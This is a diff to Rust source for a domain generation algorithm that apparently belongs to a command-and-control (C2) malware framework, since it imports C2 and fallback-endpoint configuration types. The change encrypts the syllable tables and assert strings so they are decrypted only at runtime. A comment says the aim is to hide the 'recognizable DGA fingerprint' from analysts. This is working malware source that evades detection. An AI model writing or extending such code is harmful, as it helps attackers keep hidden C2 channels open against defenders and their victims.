@@ -22,7 +22,10 @@
 //   • No external deps - pure Rust, no RNG state.
 //   • No crypto - deliberately fast; security comes from seed secrecy.
 
+use std::sync::OnceLock;
 use std::time::{SystemTime, UNIX_EPOCH};
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 use crate::common::{C2Config, DgaConfig, FallbackEndpoint, TransportProtocol};
 
 // ── FNV-1a constants ─────────────────────────────────────────────────────────
@@ -59,17 +62,23 @@ fn fnv1a_extend(h: u64, step: u64) -> u64 {
 
 // ── Syllable tables ──────────────────────────────────────────────────────────
 
-const CONSONANTS: &[u8] = b"bcdfghjklmnprstvwxz"; // 19
-const VOWELS:     &[u8] = b"aeiou";                // 5
+// Syllable tables are decrypted at first use (a static CVC alphabet is a
+// recognizable DGA fingerprint in the binary).
+static CONSONANTS: OnceLock<Vec<u8>> = OnceLock::new();
+static VOWELS:     OnceLock<Vec<u8>> = OnceLock::new();
+fn consonants() -> &'static [u8] { CONSONANTS.get_or_init(|| aes_str!("bcdfghjklmnprstvwxz").into_bytes()) }
+fn vowels()     -> &'static [u8] { VOWELS.get_or_init(|| aes_str!("aeiou").into_bytes()) }
 
 /// Extract one CVC/CV syllable from a hash value.
 /// Returns 2 or 3 characters: consonant + vowel [+ optional trailing consonant].
 fn syllable(h: u64) -> (char, char, Option<char>) {
-    let c1 = CONSONANTS[(h         as usize) % CONSONANTS.len()] as char;
-    let v  = VOWELS    [((h >> 8)  as usize) % VOWELS.len()]     as char;
+    let cons = consonants();
+    let vows = vowels();
+    let c1 = cons[(h         as usize) % cons.len()] as char;
+    let v  = vows[((h >> 8)  as usize) % vows.len()]     as char;
     // Trailing consonant only when bits 16-17 == 0b00 (25% of the time)
     let trail = if (h >> 16) & 3 == 0 {
-        Some(CONSONANTS[((h >> 18) as usize) % CONSONANTS.len()] as char)
+        Some(cons[((h >> 18) as usize) % cons.len()] as char)
     } else {
         None
     };
@@ -99,7 +108,7 @@ pub fn current_window(window_secs: u64) -> u64 {
 /// # Returns
 /// A lowercase hostname like `"bekal.com"` or `"torinvex.net"`.
 pub fn generate_domain(seed: u64, window: u64, index: u32, tlds: &[&str]) -> String {
-    assert!(!tlds.is_empty(), "tlds must not be empty");
+    assert!(!tlds.is_empty(), "{}", aes_str!("tlds must not be empty"));
 
     let mut h = fnv1a_mix(seed, window, index);
 
